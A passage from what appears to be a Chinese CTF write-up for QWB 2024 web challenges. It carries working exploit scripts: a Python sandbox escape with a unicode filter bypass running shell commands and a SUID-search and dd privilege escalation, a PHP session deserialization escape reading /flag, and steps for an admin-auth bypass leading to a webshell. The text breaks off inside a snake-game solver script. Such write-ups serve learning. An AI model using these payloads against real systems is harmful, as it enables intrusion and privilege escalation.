这篇文章</a> 中<code>其他不触发hook的方式</code>中的第三个，从而绕过import，最终exp如下：</p><figure class="highlight python"><figcaption><span>title:exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment">## return False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():</span><br><span class="line">            code = <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code += <span class="string">&quot;\n&quot;</span> + block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&#x27;Operation not permitted: &#123;&#125;&#x27;.format(event_name))</span></span><br><span class="line"><span class="string">            #raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_bypass</span>(<span class="params">payload</span>):</span><br><span class="line">    waf = <span class="string">&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line">    length = <span class="number">10500</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> waf:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            <span class="keyword">if</span> unidecode.unidecode(<span class="built_in">chr</span>(i)) == c <span class="keyword">and</span> <span class="built_in">ord</span>(c) != i:</span><br><span class="line">                payload = payload.replace(c, <span class="built_in">chr</span>(i))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == length-<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(c + <span class="string">&quot; not found.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;whoami&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;ls -la /&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;find / -user root -perm -4000 -print 2&gt;/dev/null&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;LFILE=/flag &amp;&amp; dd if=$LFILE&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = unicode_bypass(payload)</span><br><span class="line"><span class="comment">## payload = &#x27;´)·print(123)۞´&#x27;</span></span><br><span class="line">post_data = <span class="string">&quot;&quot;&quot;&#123;&quot;blocks&quot;:&#123;&quot;languageVersion&quot;:0,&quot;blocks&quot;:[&#123;&quot;type&quot;:&quot;print&quot;,&quot;id&quot;:&quot;=,2Vdt^u?s)z/Q=Fb/[Y&quot;,&quot;x&quot;:33,&quot;y&quot;:162,&quot;inputs&quot;:&#123;&quot;TEXT&quot;:&#123;&quot;block&quot;:&#123;&quot;type&quot;:&quot;text&quot;,&quot;fields&quot;:&#123;&quot;TEXT&quot;:&quot;%s&quot;&#125;&#125;&#125;&#125;&#125;]&#125;&#125;&quot;&quot;&quot;</span> % (payload)</span><br><span class="line"><span class="built_in">print</span>(post_data)</span><br><span class="line"><span class="comment">## blockly_data = json.loads(post_data)</span></span><br><span class="line"><span class="comment">## try:</span></span><br><span class="line"><span class="comment">##     python_code = json_to_python(blockly_data)</span></span><br><span class="line"><span class="comment">##     print(do(python_code))</span></span><br><span class="line"><span class="comment">## except Exception as e:</span></span><br><span class="line"><span class="comment">##     jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)</span></span><br></pre></td></tr></table></figure><p>rce之后发现权限是nobody，使用dd的suid提权，不再赘述<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/24746009105f54f65a54a48ae570d59e.png"></p><h2 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name platform -p 8080:80 sketchpl4ne/qwb2024:platform_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>思路：session反序列化+字符减少反序列化逃逸</p><p>坑点：win上使用phpstudy搭建的环境，存在字符不会替换的情况，最好起docker或者linux虚拟机</p><p>赛后又看了下，发现其实挺简单的，首先<code>class.php</code>存在字符减少逃逸<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2c9bbcb439ae0634ab1e85dabc7cf3f8.png"><br>然后开了session_start()，<code>dashboard.php</code>这里调用了session，是反序列化点<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/de76a4d0ada05d153851518a8754cb16.png"></p><p>PS：注意到<code>index.php</code>在序列化数据里插入随机长度session-key增加难度，采用爆破方式去赌概率即可，另外调试环境可知需要访问两次才可使恶意字符被置空，所以先访问两次<code>index.php</code>置空构造payload，再访问<code>dashboard.php</code>触发反序列化。</p><p>exp如下：</p><figure class="highlight python"><figcaption><span>title:exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## --coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;popen&#x27;</span>*<span class="number">10</span>,</span><br><span class="line">    <span class="comment">## &#x27;password&#x27;: &#x27;;a|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;&quot;&quot;;a|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:20:&quot;syssystemtem(&#x27;cat /flag&#x27;);&quot;;&#125;&quot;&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;dabe6d7479f521b93d2646924d8810b0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    requests.post(url, data=payload,cookies=cookie,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    requests.post(url, data=payload, cookies=cookie,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    res = requests.get(url + <span class="string">&quot;dashboard.php&quot;</span>,cookies=cookie)</span><br><span class="line">    <span class="comment">## if &quot;PHP Version 7.3.33&quot; in res.text:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] test <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a1eea41f7961e715e783f93569fac24.png"></p><h2 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name xiaohuanxiong -p 8080:80 -p 3306:3306 sketchpl4ne/qwb2024:xiaohuanxiong_img</span><br></pre></td></tr></table></figure><p>启动后进<code>/install</code>路由安装，数据库名称<code>hm</code>，密码<code>root/root</code>，测试数据库连接以后安装<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fd444c9425bcbb5002234deb421a6825.png"></p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>代码审计直接有未授权后台登录：<code>/admin/admins/</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a04dbb9d26d79e2e9deb5d4e854f272e.png"></p><p>然后就可以新建管理员账户<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/dceef1139b6bdce89d16ad0300efd9a8.png"></p><p>然后在支付设置那里，可以php代码执行，会写到配置文件里，哪都可以包含。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c23edf9e9f2a839e01185dbd05c016ed.png"><br>写shell，拿flag<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/0082293b4e457cd385a2e0a0297c6d71.png"></p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这题没出，网上也没找到环境，只能看看wp (不过也没啥新东西)</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>思路：GPT跑贪吃蛇+ 伪装成sql注入的ssti</p><figure class="highlight python"><figcaption><span>title:fuzz_snake.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> PriorityQueue</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy <span class="keyword">as</span> dcp</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze28vznmiok836ummk1.cloudeci1.ichunqiu.com:5000&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line">direc = (<span class="string">&quot;RIGHT&quot;</span>, <span class="string">&quot;DOWN&quot;</span>, <span class="string">&quot;LEFT&quot;</span>, <span class="string">&quot;UP&quot;</span>)</span><br><span class="line">size = <span class="number">20</span></span><br><span class="line">board = np.zeros((size, size), dtype=<span class="built_in">int</span>)</span><br><span class="line">QUE = PriorityQueue()</span><br><span class="line">FourDirec = <span class="keyword">lambda</span> x, y: [</span><br><span class="line">    (x + <span class="number">1</span>, y, <span class="number">1</span>),</span><br><span class="line">    (x - <span class="number">1</span>, y, <span class="number">3</span>),</span><br><span class="line">    (x, y + <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">    (x, y - <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login_Start</span>(<span class="params">name</span>):</span><br><span class="line">    req.post(url + <span class="string">&quot;/set_username&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: name&#125;)</span><br><span class="line">    req.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendmove</span>(<span class="params">direction</span>):</span><br><span class="line">    res = req.post(url + <span class="string">&quot;/move&quot;</span>, json=&#123;<span class="string">&quot;direction&quot;</span>: direction&#125;)</span><br><span class="line">    <span class="comment">## print(res.text)</span></span><br><span class="line">    data = json.loads(res.text)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;status&quot;</span>] == <span class="string">&quot;ok&quot;</span>:</span><br><span class="line">        food = data[<span class="string">&quot;food&quot;</span>][::-<span class="number">1</span>]</span><br><span class="line">        snake = [i[::-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="string">&quot;snake&quot;</span>]]</span><br><span class="line">        score = data[<span class="string">&quot;score&quot;</span>]</span><br><span class="line">        <span class="comment">## print(food, snake)</span></span><br><span class="line">        <span class="keyword">return</span> food, snake, score</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">food, snake</span>):</span><br><span class="line">    head = snake[<span class="number">0</span>]</span><br><span class="line">    dist = <span class="built_in">abs</span>(food[<span class="number">0</span>] - head[<span class="number">0</span>]) + <span class="built_in">abs</span>(food[<span class="number">1</span>] - head[<span class="number">1</span>])</span><br><span class="line">    path = [(-<span class="number">1</span>, 